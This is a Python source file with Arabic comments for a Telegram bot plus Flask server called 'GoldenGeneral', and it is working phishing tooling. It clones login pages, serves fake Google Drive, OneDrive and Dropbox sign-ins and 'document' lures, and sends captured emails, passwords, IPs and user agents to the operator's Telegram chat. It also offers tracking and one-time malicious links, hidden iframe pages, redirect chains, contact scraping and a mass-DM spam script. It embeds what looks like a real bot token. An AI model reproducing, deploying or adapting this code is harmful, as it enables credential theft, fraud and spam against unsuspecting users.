import os, re, uuid, logging, tempfile, asyncio
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, send_from_directory, abort, redirect
import qrcode
from threading import Thread
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ========== القيم المدمجة ==========
BOT_TOKEN = "8511885419:AAHi0yNNaA1IVDtulFZBokSb9l_KbXaQe38"
ADMIN_CHAT = "6829017835"
RENDER_URL = "https://goldengeneral.onrender.com"
# ====================================

TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)

# تخزين مؤقت
phish_pages = {}
one_time_links = {}
redirect_chains = {}
qr_images = {}
iframe_pages = {}

# ---- Flask Routes ----
@app.route('/phish/<page_id>')
def serve_phish(page_id):
    page = phish_pages.get(page_id)
    if not page:
        abort(404)
    html, original_url, page_type = page
    return html.replace("{form_action}", f"/submit/{page_id}")

@app.route('/submit/<page_id>', methods=['POST'])
def submit_phish(page_id):
    data = request.form.to_dict()
    message = f"🎣 صيد جديد من الصفحة {page_id}:\n"
    for k, v in data.items():
        message += f"{k}: {v}\n"
    message += f"\nIP: {request.remote_addr}\nAgent: {request.headers.get('User-Agent')}"
    requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": ADMIN_CHAT, "text": message})
    ori = phish_pages[page_id][1]
    return redirect(ori, code=302)

@app.route('/track/<track_id>')
def track_visit(track_id):
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    msg = f"🕵️‍♂️ زائر جديد لرابط التعقب {track_id}\nIP: {ip}\nAgent: {ua}"
    requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": ADMIN_CHAT, "text": msg})
    return redirect("https://google.com", code=302)

@app.route('/chain/<chain_id>')
def chain_redirect(chain_id):
    chain = redirect_chains.get(chain_id)
    if not chain:
        abort(404)
    ip = request.remote_addr
    msg = f"⛓️ سلسلة {chain_id}: زار {request.base_url} من {ip}"
    requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": ADMIN_CHAT, "text": msg})
    next_url = chain.pop(0)
    if not chain:
        del redirect_chains[chain_id]
    return redirect(next_url, code=302)

@app.route('/sniper/<link_id>')
def sniper_link(link_id):
    if link_id not in one_time_links:
        abort(404)
    target, visited = one_time_links[link_id]
    if visited:
        abort(404)
    one_time_links[link_id] = (target, True)
    ip = request.remote_addr
    msg = f"🔫 رابط القناص {link_id} ضرب!\nIP: {ip}\nالهدف: {target}"
    requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": ADMIN_CHAT, "text": msg})
    return redirect(target, code=302)

@app.route('/iframe/<frame_id>')
def serve_iframe(frame_id):
    html = iframe_pages.get(frame_id)
    if not html:
        abort(404)
    return html

@app.route('/qr/<qr_id>')
def serve_qr(qr_id):
    if qr_id not in qr_images:
        abort(404)
    return send_from_directory(tempfile.gettempdir(), f"qr_{qr_id}.png", mimetype='image/png')

@app.route('/')
def health():
    return "GoldenGeneral is live"

# ---- Telegram Handlers ----
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🥇 **الجنرال الذهبي** تحت أمرك.\n\n"
        "/phish <رابط> - استنساخ صفحة تسجيل.\n"
        "/scrape <رابط> - جمع الروابط والإيميلات.\n"
        "/track [رابط] - رابط تعقب.\n"
        "/qr <رابط> - كود QR.\n"
        "/massdm - سكريبت الإرسال.\n"
        "/iframe <رابط> - صفحة إطار خفي.\n"
        "/chain <رابط> ... - سلسلة إعادة توجيه.\n"
        "/docphish <اسم> - مستند تصيد.\n"
        "/cloud <service> - صفحة سحابة مزيفة.\n"
        "/sniper <رابط> - رابط مرة واحدة.\n\n"
        "استخدم /help <command> للتفاصيل."
    )

async def phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("الاستخدام: /phish <رابط صفحة الدخول>")
        return
    url = context.args[0]
    try:
        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        page_id = str(uuid.uuid4())[:8]
        for form in soup.find_all('form'):
            form['action'] = f"/submit/{page_id}"
        modified_html = str(soup)
        phish_pages[page_id] = (modified_html, url, 'generic')
        await update.message.reply_text(f"🎣 صفحة التصيد: {RENDER_URL}/phish/{page_id}")
    except Exception as e:
        await update.message.reply_text(f"خطأ: {e}")

async def scrape(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("الاستخدام: /scrape <رابط>")
        return
    url = context.args[0]
    try:
        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        links = [a.get('href') for a in soup.find_all('a', href=True)]
        emails = set(re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', resp.text))
        phones = set(re.findall(r'[\+\(]?[0-9][0-9 .\-\(\)]{8,}[0-9]', resp.text))
        result = f"🔗 **الروابط** ({len(links)}):\n"
        for l in links[:20]:
            result += f"{l}\n"
        result += f"\n📧 **الإيميلات** ({len(emails)}):\n" + "\n".join(emails)
        result += f"\n📞 **الهواتف** ({len(phones)}):\n" + "\n".join(phones)
        await update.message.reply_text(result[:4000])
    except Exception as e:
        await update.message.reply_text(f"خطأ: {e}")

async def track(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = context.args[0] if context.args else "https://google.com"
    track_id = str(uuid.uuid4())[:8]
    link = f"{RENDER_URL}/track/{track_id}"
    await update.message.reply_text(f"رابط التعقب: {link} (يعيد التوجيه إلى {target})")

async def qr_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("الاستخدام: /qr <رابط>")
        return
    url = context.args[0]
    qr_id = str(uuid.uuid4())[:8]
    img = qrcode.make(url)
    img_path = os.path.join(tempfile.gettempdir(), f"qr_{qr_id}.png")
    img.save(img_path)
    qr_images[qr_id] = img_path
    await update.message.reply_photo(photo=InputFile(img_path), caption=f"رابط الصورة: {RENDER_URL}/qr/{qr_id}")

async def massdm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    script = f'''# Mass DM Script
import requests
API_TOKEN = "{BOT_TOKEN}"
target_message = "شاهد هذا: YOUR_LINK"
users = ["user1", "user2"]
for user in users:
    requests.post(f"https://api.telegram.org/bot{{API_TOKEN}}/sendMessage", json={{"chat_id": user, "text": target_message}})'''
    await update.message.reply_text(f"سكريبت الإرسال الجماعي:\n```python\n{script}\n```", parse_mode="Markdown")

async def iframe_ghost(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("الاستخدام: /iframe <رابط>")
        return
    url = context.args[0]
    frame_id = str(uuid.uuid4())[:8]
    html = f'''<html><head><title>Loading...</title></head>
<body style="margin:0;padding:0">
<iframe src="{url}" width="100%" height="100%" style="border:none;position:fixed;top:0;left:0;"></iframe>
<script>fetch("/track/{frame_id}")</script></body></html>'''
    iframe_pages[frame_id] = html
    await update.message.reply_text(f"رابط الإطار الخفي: {RENDER_URL}/iframe/{frame_id}")

async def chain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("الاستخدام: /chain <رابط1> <رابط2> ...")
        return
    links = list(context.args)
    chain_id = str(uuid.uuid4())[:8]
    redirect_chains[chain_id] = links[1:]
    await update.message.reply_text(f"سلسلة إعادة التوجيه: {RENDER_URL}/chain/{chain_id}")

async def docphish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = " ".join(context.args) if context.args else "تقرير_هام"
    page_id = str(uuid.uuid4())[:8]
    html = f'''<html><head><title>{name}</title></head>
<body><h1>{name}</h1><p>الرجاء تسجيل الدخول لعرض المستند:</p>
<form action="/submit/{page_id}" method="POST">
<input name="email" placeholder="بريدك"><br>
<input name="password" type="password" placeholder="كلمة السر"><br>
<button>عرض</button></form></body></html>'''
    phish_pages[page_id] = (html, "https://example.com", 'doc')
    await update.message.reply_text(f"مستند التصيد: {RENDER_URL}/phish/{page_id}")

async def cloud_snatch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    service = context.args[0].lower() if context.args else "gdrive"
    templates = {
        "gdrive": ("Google Drive", "<h1>Google Drive</h1><p>تسجيل الدخول للمتابعة</p>"),
        "onedrive": ("OneDrive", "<h1>OneDrive</h1><p>تسجيل الدخول</p>"),
        "dropbox": ("Dropbox", "<h1>Dropbox</h1><p>Sign in</p>"),
    }
    title, body = templates.get(service, templates["gdrive"])
    page_id = str(uuid.uuid4())[:8]
    html = f'''<html><head><title>{title}</title></head><body>{body}
<form action="/submit/{page_id}" method="POST">
<input name="email" placeholder="Email"><br>
<input name="password" type="password" placeholder="Password"><br>
<button>Login</button></form></body></html>'''
    phish_pages[page_id] = (html, f"https://{service}.com", 'cloud')
    await update.message.reply_text(f"صفحة {service}: {RENDER_URL}/phish/{page_id}")

async def sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("الاستخدام: /sniper <الرابط الخبيث>")
        return
    target = context.args[0]
    link_id = str(uuid.uuid4())[:8]
    one_time_links[link_id] = (target, False)
    await update.message.reply_text(f"رابط القناص: {RENDER_URL}/sniper/{link_id}")

def start_bot():
    """تشغيل البوت في خيط مع حلقة أحداث خاصة"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    telegram_app = ApplicationBuilder().token(BOT_TOKEN).build()
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("phish", phish))
    telegram_app.add_handler(CommandHandler("scrape", scrape))
    telegram_app.add_handler(CommandHandler("track", track))
    telegram_app.add_handler(CommandHandler("qr", qr_gen))
    telegram_app.add_handler(CommandHandler("massdm", massdm))
    telegram_app.add_handler(CommandHandler("iframe", iframe_ghost))
    telegram_app.add_handler(CommandHandler("chain", chain))
    telegram_app.add_handler(CommandHandler("docphish", docphish))
    telegram_app.add_handler(CommandHandler("cloud", cloud_snatch))
    telegram_app.add_handler(CommandHandler("sniper", sniper))
    # استخدام run_polling مع إغلاق الحلقة عند الخروج
    telegram_app.run_polling(close_loop=False)
    loop.close()

if __name__ == '__main__':
    # تشغيل البوت في خيط منفصل
    bot_thread = Thread(target=start_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)